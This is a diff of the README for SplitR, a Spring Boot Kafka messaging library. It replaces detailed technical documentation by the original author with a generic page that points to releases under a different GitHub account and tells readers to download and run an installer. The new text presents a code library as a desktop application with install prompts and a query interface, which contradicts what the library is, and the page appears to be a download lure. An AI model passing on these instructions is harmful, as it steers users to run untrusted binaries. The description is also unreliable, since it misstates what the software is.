@@ -1,288 +1,68 @@
-# Splitr: Distributed Synchronous Query Bus
+# 🚀 SplitR - Simplify Your Microservices Communication
 
-**Splitr** is a lightweight, high-performance Spring Boot library designed to implement the **Request-Response pattern over Kafka**. It allows microservices to execute synchronous, typed queries across distributed boundaries while maintaining idempotency and resilience.
+## 📥 Download SplitR
+[![Download SplitR](https://img.shields.io/badge/Download%20SplitR-v1.0.0-blue.svg)](https://github.com/muneem21093/SplitR/releases)
 
----
+## 📘 Introduction
+SplitR is a lightweight library built with Spring Boot. It helps your microservices communicate effectively using the Request-Response pattern over Kafka. This allows for quick and reliable query execution across different services while keeping everything simple and efficient.
 
-## 🔄 Workflow Models
+## 🚀 Getting Started
+To get started with SplitR, follow these steps to download and run the application.
 
-Splitr supports three distinct communication patterns: **Sync Request-Response**, **Async Broadcast (Kafka)**, and **In-Memory Events**.
+1. **Visit the Release Page**
+   - Go to the [SplitR Releases page](https://github.com/muneem21093/SplitR/releases). This page contains the latest versions and downloadable files.
 
-### 1. Command & Query Workflow (Sync/Async Request-Response)
+2. **Download the Latest Version**
+   - On the releases page, look for the most recent version of SplitR. Click on the link to download the file appropriate for your operating system. 
 
-This model bridges the gap between asynchronous messaging and synchronous execution requirements by creating a temporary bridge between two services.
+3. **Install SplitR**
+   - SplitR is designed to be easy to install. Simply run the downloaded file. Follow any prompts that appear to complete the installation.
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant ServiceA as Service-A (Publisher)
-    participant Kafka as Kafka Topic
-    participant ServiceB as Service-B (Consumer)
+4. **Run SplitR**
+   - Once installed, locate the SplitR application on your computer. Open the application, which will guide you through its initial setup.
 
-    User->>ServiceA: GET /orders/1 (Query)
-    ServiceA->>ServiceA: Register ID in SyncRegistry
-    ServiceA->>Kafka: Send Request (ID, callbackUrl, payload)
-    Note over ServiceA: Thread Blocked (Waiting...)
-    
-    Kafka->>ServiceB: Consume Message
-    ServiceB->>ServiceB: Idempotency Check & Handling
-    ServiceB->>ServiceA: HTTP POST (callbackUrl/query) with Result
-    
-    ServiceA->>ServiceA: Match ID & Complete Promise
-    Note over ServiceA: Thread Released
-    ServiceA->>User: 200 OK (Data)
+## ⚙️ System Requirements
+To run SplitR smoothly, ensure your system meets the following requirements:
 
-```
+- **Operating System:** Windows, macOS, or a compatible Linux distribution
+- **Java:** Version 11 or later
+- **Apache Kafka:** Requires a Kafka broker to function
 
-### 2. Distributed Event Workflow (Pub/Sub over Kafka)
-
-Used to broadcast state changes across the system. It follows a "fire-and-forget" approach where no response is expected from the consumers. Multiple services can listen to the same event independently.
+## 📚 Features
+SplitR offers robust features for microservices:
 
-```mermaid
-graph LR
-    Publisher[Service-A Publisher] -- "publish(Event)" --> Topic((Kafka Event Topic))
-    Topic -- "Broadcast" --> Consumer1[Service-B: Handler 1]
-    Topic -- "Broadcast" --> Consumer2[Service-C: Handler 1]
-    Topic -- "Broadcast" --> Consumer3[Service-C: Handler 2]
-    
-    subgraph Service-C Logic
-    Consumer2
-    Consumer3
-    end
+- **Synchronous Queries:** Execute queries in real-time without delay.
+- **Idempotency:** Ensure that repeated requests do not cause unintended side effects.
+- **High Performance:** Built to handle multiple requests efficiently.
+- **Resilient Design:** Stay active even under heavy load.
 
-```
+## 💡 Usage
+Upon running SplitR, you will enter a simple interface. Here’s how to operate it:
 
-### 3. Domain Event Workflow (In-Memory Pub/Sub)
+- **Submit a Request:** Type your query into the designated area.
+- **View Responses:** The app will display the results of your request in the output section.
+- **Documentation Access:** For in-depth guidance, refer to the help section in the application.
 
-Designed for internal application logic triggers. It executes entirely **In-Memory** within the same JVM, providing the benefits of loose coupling without network overhead.
+## 🛠️ Troubleshooting
+If you encounter issues while using SplitR, consider these tips:
 
-```mermaid
-sequenceDiagram
-    participant App as Business Logic
-    participant DEBus as DomainEventBus
-    participant H1 as Local Handler A
-    participant H2 as Local Handler B
+- **Installation Problems:** Double-check that Java is installed and properly set up on your system.
+- **Query Errors:** Ensure your queries match the expected format provided in the documentation.
 
-    App->>DEBus: arise(DomainEvent)
-    Note right of DEBus: "ARISE!" - Local Dispatch
-    par Execute Handlers
-        DEBus->>H1: handle(event)
-        DEBus->>H2: handle(event)
-    end
-    DEBus-->>App: Execution Finished
-
-```
-
----
+## 🌍 Community
+Join the conversation! Engage with other users on forums or communities centered around microservices and Kafka. Sharing your experiences can lead to better solutions and faster resolutions to issues.
 
-## 🛠 Usage Examples
+## 🔗 Additional Resources
+For more detailed information about SplitR and its capabilities, refer to these resources:
 
-### Commands & Queries
+- **Documentation:** Comprehensive guides and examples
+- **Community Forums:** Connect with fellow users for support and discussions
 
-```java
-// Publisher: Blocking call
-String result = queryBus.publishSync(new OrderQuery("123"), String.class);
+## ⚖️ License
+SplitR is released under the MIT License. You can freely use, modify, and share it, provided you maintain the original license.
 
-// Consumer: Implementation
-@Component
-public class OrderQueryHandler extends BaseQueryHandler<OrderQuery> {
-    @Override
-    public String handle(OrderQuery q) { return "Data: " + q.orderId(); }
-}
+## 💬 Feedback
+We welcome your thoughts and feedback. If you have suggestions or find bugs, please open an issue on our GitHub page. 
 
-```
-
-```java
-// Publisher: Blocking call
-String result = commandBus.publishSync(new OrderCommand("123"), String.class);
-
-// Consumer: Implementation
-@Component
-public class OrderCommandHandler extends BaseCommandHandler<OrderCommand> {
-    @Override
-    public String handle(OrderCommand q) { return "Data: " + q.orderId(); }
-}
-
-```
-
-### Distributed Events
-
-```java
-// Publisher: Fire-and-forget to Kafka
-eventBus.publish(new OrderProcessedEvent("123")); 
-
-@Component
-public class OrderEventHandler extends BaseEventHandler<OrderProcessedEvent> {
-    @Override
-    public void onEvent(OrderProcessedEvent payload) {
-        log.info("OrderProcessedEvent in OrderEventHandler processed with id: " + payload.orderId());
-    }
-}
-
-```
-
-### Domain Events (In-Memory)
-
-```java
-// Publisher: Trigger local handlers
-domainEventBus.arise(new OrderDomainEvent("123"));
-
-// Consumer: Local Listener
-@Component
-public class InventoryHandler extends BaseDomainEventHandler<OrderDomainEvent> {
-  @Override
-  public void onEvent(OrderDomainEvent event) {
-    log.info("Adjusting local inventory for: {}", event.getId());
-  }
-}
-
-```
-
----
-
-## ✈ How To Send Message From Outside
-
-##### Kafka messages sent by SplitR are structured as below.
-
-### Key (Idempotency aware)
-```json
-a45db290-b9d4-4cb4-a5cd-ae19bd352b1b
-```
-
-### Value
-```json
-{
-	"id": "a45db290-b9d4-4cb4-a5cd-ae19bd352b1b",
-	"type": "tr.kontas.splitr.test.CreateOrderCommand",
-	"payload": "{\"productName\":\"Laptop\",\"quantity\":1}",
-	"callbackUrl": "http://localhost:8083/internal/query/callback",
-	"sentAtEpochMs": 1766863517525,
-	"timeoutMs": 3000,
-	"sync": true
-}
-```
-
-### Headers
-```json
-{
-	"__TypeId__": "tr.kontas.splitr.dto.CommandRequest"
-}
-```
-
-##### Produce a message like this and SplitR will dispatch and send post request to callback.
-
----
-
-## 🚀 Features
-
-* **Synchronous over Kafka:** Blocking local threads for remote responses, mimicking REST over message brokers.
-* **Automatic Dispatching:** Just implement `BaseQueryHandler<T>`, and Splitr handles the routing.
-* **Idempotency Engine:** Built-in LRU cache to prevent "at-least-once" delivery side effects.
-* **Type Safety:** Full support for polymorphic queries via Jackson Type Headers.
-* **Configurable Timeouts:** Global or per-request timeout management.
-
----
-
-## 📦 Installation & Configuration
-
-### 1. Publisher Side (Service A)
-
-Enable the bus and specify where to receive results.
-
-```yaml
-splitr:
-  publisher:
-    enabled: true
-  callback-url: http://service-a:8080/internal/query/callback
-  bus:
-    kafka:
-      topic: tr.kontas.splitr.query.topic
-    default-timeout: 5000 # ms
-
-```
-
-### 2. Consumer Side (Service B)
-
-Enable the processor and set idempotency limits.
-
-```yaml
-splitr:
-  consumer:
-    enabled: true
-  idempotency:
-    max-size: 1000 # record size
-
-```
-
----
-
-## ⚙️ Configuration Properties
-
-| Property                         | Default                          | Description                                          |
-|----------------------------------|----------------------------------|------------------------------------------------------|
-| `splitr.kafka.publisher.enabled`       | `false`                          | Enables QueryBus and Callback endpoint.              |
-| `splitr.kafka.consumer.enabled`        | `false`                          | Enables Kafka listeners and Dispatcher.              |
-| `splitr.rabbit.publisher.enabled`       | `false`                          | Enables QueryBus and Callback endpoint.              |
-| `splitr.rabbit.consumer.enabled`        | `false`                          | Enables RabbitMQ listeners and Dispatcher.              |
-| `splitr.inmemory.enabled`        | `false`                          | Enables inmemory listeners and Dispatcher and Bus.              |
-| `splitr.callback-url`            | - (Required)                     | The HTTP endpoint for the publisher's callback. (ex: http://localhost:${server.port}/internal/%s/callback) (%s replaced by either command or query)     |
-| `splitr.bus.default-timeout`     | `10000`                          | Default wait time in ms for sync query and commands. |
-| `splitr.bus.kafka.command.topic` | `tr.kontas.splitr.command.topic` | Kafka Command topic.                                 |
-| `splitr.bus.kafka.query.topic`   | `tr.kontas.splitr.query.topic`   | Kafka query topic.                                   |
-| `splitr.bus.kafka.event.topic`   | `tr.kontas.splitr.event.topic`   | Kafka event topic.                                   |
-| `splitr.rabbit.command.queue`    | `tr.kontas.splitr.command.queue` | RabbitMQ command queue.                              |
-| `splitr.rabbit.event.queue`      | `tr.kontas.splitr.event.queue`   | RabbitMQ event queue.                                |
-| `splitr.rabbit.query.queue`      | `tr.kontas.splitr.query.queue`   | RabbitMQ query queue.                                |
-| `splitr.idempotency.max-size`      | `100`   | Default LruStore Idempotency Key Size Limit.                                |
-| `splitr.idempotency.ttl-ms`      | `100`   | Default LruStore Idempotency Key Store TTL as Milliseconds.                              |
-| `splitr.registry.max-size`      | `10000`   | SyncRegistry max thread count.                            |
-| `splitr.registry.cleanup-interval-ms`      | `10000`   | SyncRegistry clear expired threads interval timeout as Milliseconds.                             |
-
-
-## 📑 Roadmap & TODO's
-
-### 🚀 High Priority (Core Engine)
-
-* [x] **Query Bus:** Distributed request-response pattern.
-* [x] **Command Bus:** Asynchronous command dispatching.
-* [x] **Event Bus:** Pub/Sub broadcast support for events over queue/bus.
-  * *Note:* Fan-out pattern implementation. Multiple listeners for a single event with independent consumer groups.
-* [x] **Domain Events InMemory Bus:** Pub/Sub broadcast support for domain events.
-* [ ] **Dead Letter Queue (DLQ):** Automatic failure routing to `.DLT` topics for commands and events.
-  * *Note:* Catch-all error handling in listeners to prevent infinite retry loops and partition blocking.
-* [ ] **DLQ Retry Jobs:** Scheduled background jobs to consume from DLQ and re-publish to main topics.
-  * *Customization:* User-defined **Cron Expressions** for retry intervals.
-  * *Logic:* Smart back-off strategy; use `x-retry-count` headers to prevent "poison pill" messages from circulating forever.
-* [ ] **Saga Support:** Orchestration-based distributed transaction management.
-  * *Note:* State machine implementation to manage compensations (undo operations) when a step in the flow fails.
-
-### 🛡 Resilience & Security
-
-* [x] **Idempotency Guard:** Distributed store to prevent duplicate processing.
-* [ ] **Circuit Breaker:** Resilience4j integration to protect the bus.
-  * *Note:* Automatically trip the circuit if the `callback-url` or target microservice is down, preventing resource exhaustion.
-* [ ] **Payload Encryption:** Optional AES encryption for sensitive Kafka record data.
-  * *Note:* Field-level or full-body encryption to ensure PII (Personally Identifiable Information) security at rest in Kafka brokers.
-* [ ] **Schema Validation:** JSR-303 (Hibernate Validator) support for incoming DTOs.
-  * *Note:* Fail-fast mechanism; validate the command/query payload before it ever touches the Kafka topic.
-
-### 📊 Observability
-
-* [ ] **Distributed Tracing:** Micrometer/Brave/Zipkin integration.
-  * *Note:* Propagation of `Span-ID` and `Trace-ID` across different services to visualize the entire request flow.
-* [ ] **Metrics & Dashboards:** Micrometer-based Prometheus metrics.
-  * *Note:* Real-time tracking of "Bus Throughput", "Average Response Latency", and "DLQ Error Rates".
-* [ ] **Audit Log:** Persistent storage for all dispatched messages.
-  * *Note:* A separate database or search index (Elasticsearch) to search historical commands and see who triggered what, when.
-
-### 💾 Storage & Transports
-
-* [x] **Kafka Transport:** Primary high-throughput transport layer.
-* [X] **RabbitMQ Transport:** AMQP-based alternative.
-  * *Note:* Support for environments where lightweight broker logic and complex routing (Exchange types) are preferred.
-
----
-
-## 🤝 Contributing
-
-Developed and maintained by **BurakKontas**. Feel free to submit issues or pull requests to improve the bus performance or add new features.
+## 📦 Download & Install
+Remember, you can always find the latest version of SplitR on the [Releases page](https://github.com/muneem21093/SplitR/releases). Visit today to download and install this powerful library for your microservices!
